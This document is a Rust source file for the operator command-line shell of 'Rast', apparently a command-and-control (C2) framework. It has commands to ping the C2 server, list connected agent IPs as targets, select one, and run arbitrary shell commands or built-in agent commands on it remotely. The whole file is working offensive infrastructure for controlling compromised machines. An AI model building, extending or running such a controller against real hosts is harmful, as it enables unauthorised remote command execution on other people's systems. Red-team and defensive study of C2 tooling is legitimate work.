//! The Command-line Interface part of the Rast project.

use std::{
    error::Error,
    fmt::{Display, Formatter},
    net::{IpAddr, SocketAddr},
    str::FromStr,
    sync::Arc,
    vec,
};

use futures_util::{sink::SinkExt, stream::StreamExt};
use rast::{
    encoding::{JsonPackager, Packager},
    messages::ui_request::{UiRequest, UiResponse},
    protocols::{Messager, ProtoConnection},
};
use shellfish::{async_fn, handler::DefaultAsyncHandler, Command, Shell};
use tokio::sync::Mutex;

type CmdResult<T> = std::result::Result<T, Box<dyn Error>>;
type State = ShellState;

/// Local state of working connections.
#[derive(Debug)]
pub struct ShellState {
    conn: Arc<Mutex<dyn ProtoConnection>>,
    target: Option<String>,
    targets: Vec<String>,
}

impl ShellState {
    pub fn new(conn: Arc<Mutex<dyn ProtoConnection>>) -> Self {
        ShellState {
            conn,
            target: None,
            targets: vec![],
        }
    }
}
impl Display for ShellState {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        let mut prompt = String::from("[rast]");

        if let Some(target) = &self.target {
            prompt.push_str(&format!("[{target}]"));
        }

        write!(f, "{prompt} > ")
    }
}

/// Creates shell.
pub fn get_shell(state: State) -> Shell<'static, State, impl Display, DefaultAsyncHandler> {
    let mut shell = Shell::new_async(state, "[rast]> ");

    shell.commands.insert(
        "ping",
        Command::new_async("pings C2 server".into(), async_fn!(State, ping)),
    );

    shell.commands.insert(
        "get_targets",
        Command::new_async(
            "updates and prints target list".into(),
            async_fn!(State, get_targets),
        ),
    );

    shell
        .commands
        .insert("set_target", Command::new("set target".into(), set_target));

    shell.commands.insert(
        "show_state",
        Command::new("show inner state".into(), show_state),
    );

    shell.commands.insert(
        "exec_shell",
        Command::new_async(
            "run shell command on target".into(),
            async_fn!(State, exec_shell),
        ),
    );

    shell.commands.insert(
        "get_commands",
        Command::new_async(
            "get built-in commands available on the agent".into(),
            async_fn!(State, get_commands),
        ),
    );

    shell.commands.insert(
        "exec_command",
        Command::new_async(
            "run built-in command on the agent".into(),
            async_fn!(State, exec_command),
        ),
    );

    shell
}

// async fn send_request(request: UiRequest) -> Result<UiResponse> {}

/// Sends [`UiRequest::Ping`] to the C2 server to check connectivity.
async fn ping(state: &mut State, _args: Vec<String>) -> CmdResult<()> {
    let mut conn = state.conn.lock().await;

    let mut messager = Messager::new(&mut *conn);
    let packager = JsonPackager::default();

    let request = UiRequest::Ping;
    let request = packager.encode(&request)?;

    messager.send(request).await?;
    let bytes = messager.next().await.unwrap().unwrap();

    let output: UiResponse = packager.decode(&bytes.into())?;

    if output == UiResponse::Pong {
        println!("pong");
    }

    Ok(())
}

/// Gets all agents that C2 server is connected to.
async fn get_targets(state: &mut State, _args: Vec<String>) -> CmdResult<()> {
    let mut conn = state.conn.lock().await;

    // TODO: put all of that into struct and do abstractions
    let mut messager = Messager::new(&mut *conn);
    let packager = JsonPackager::default();

    let request = UiRequest::GetIps;
    let request = packager.encode(&request)?;

    messager.send(request).await?;
    let bytes = messager.next().await.unwrap().unwrap();

    let output: UiResponse = packager.decode(&bytes.into())?;

    if let UiResponse::GetIps(ips) = output {
        state.targets = ips;
    }

    for (i, target) in state.targets.iter().enumerate() {
        println!("[{i}] {target}");
    }

    Ok(())
}

/// Executes command on the specified agent.
async fn exec_shell(state: &mut State, args: Vec<String>) -> CmdResult<()> {
    if state.target.is_none() {
        println!("No target is selected");
        return Ok(());
    }

    if args.len() < 2 {
        println!("Incorrect argument number");
        return Ok(());
    }

    let mut command = String::new();
    for arg in args.iter().skip(1) {
        command.push_str(arg);
        command.push(' ');
    }
    command.pop();

    let mut conn = state.conn.lock().await;

    // TODO: put all of that into struct and do abstractions
    let mut messager = Messager::new(&mut *conn);
    let packager = JsonPackager::default();
    let (ip, port) = state.target.as_ref().unwrap().split_once(':').unwrap();

    let request = UiRequest::ShellRequest(
        SocketAddr::new(IpAddr::from_str(ip).unwrap(), u16::from_str(port)?),
        command,
    );
    let request = packager.encode(&request)?;

    messager.send(request).await?;
    let bytes = messager.next().await.unwrap()?;

    let output: UiResponse = packager.decode(&bytes.into())?;

    if let UiResponse::ShellOutput(output) = output {
        println!("{output}");
    }

    Ok(())
}

/// Executes command on the specified agent.
async fn get_commands(state: &mut State, _args: Vec<String>) -> CmdResult<()> {
    if state.target.is_none() {
        println!("No target is selected");
        return Ok(());
    }

    // if args.len() != 1 {
    //     println!("Incorrect argument number");
    //     return Ok(());
    // }

    let mut conn = state.conn.lock().await;

    // TODO: put all of that into struct and do abstractions
    let mut messager = Messager::new(&mut *conn);
    let packager = JsonPackager::default();
    let (ip, port) = state.target.as_ref().unwrap().split_once(':').unwrap();

    let request = UiRequest::GetCommands(SocketAddr::new(
        IpAddr::from_str(ip).unwrap(),
        u16::from_str(port)?,
    ));
    let request = packager.encode(&request)?;

    messager.send(request).await?;
    let bytes = messager.next().await.unwrap()?;

    let output: UiResponse = packager.decode(&bytes.into())?;

    if let UiResponse::Commands(output) = output {
        for (cmd, help) in output.iter() {
            println!("[{cmd}]\t {help}");
        }
    }

    Ok(())
}

/// Executes command on the specified agent.
async fn exec_command(state: &mut State, args: Vec<String>) -> CmdResult<()> {
    if state.target.is_none() {
        println!("No target is selected");
        return Ok(());
    }

    if args.len() < 2 {
        println!("Incorrect argument number");
        return Ok(());
    }

    let command = args[1].clone();
    let args = Vec::from(args.split_at(2).1);

    let mut conn = state.conn.lock().await;

    // TODO: put all of that into struct and do abstractions
    let mut messager = Messager::new(&mut *conn);
    let packager = JsonPackager::default();
    let (ip, port) = state.target.as_ref().unwrap().split_once(':').unwrap();

    let request = UiRequest::ExecCommand(
        SocketAddr::new(IpAddr::from_str(ip).unwrap(), u16::from_str(port)?),
        command,
        args,
    );
    let request = packager.encode(&request)?;

    messager.send(request).await?;
    let bytes = messager.next().await.unwrap()?;

    let output: UiResponse = packager.decode(&bytes.into())?;

    if let UiResponse::CommandOutput(output) = output {
        println!("{output}");
    } else {
        println!("Err");
    }

    Ok(())
}

/// Locally set target to specified agent.
fn set_target(state: &mut State, args: Vec<String>) -> CmdResult<()> {
    if args.len() != 2 {
        println!("Incorrect argument number");
        return Ok(());
    }

    let target = args.get(1).unwrap().parse::<usize>().unwrap();

    if let Some(target) = state.targets.get(target) {
        state.target = Some(target.to_string());
        println!("Target successfully set to: {target}");
    }

    Ok(())
}

fn show_state(state: &mut State, _args: Vec<String>) -> CmdResult<()> {
    println!("{state:#?}");
    Ok(())
}

#[cfg(test)]
mod tests {
    #[test]
    fn it_works() {
        let result = 2 + 2;
        assert_eq!(result, 4);
    }
}
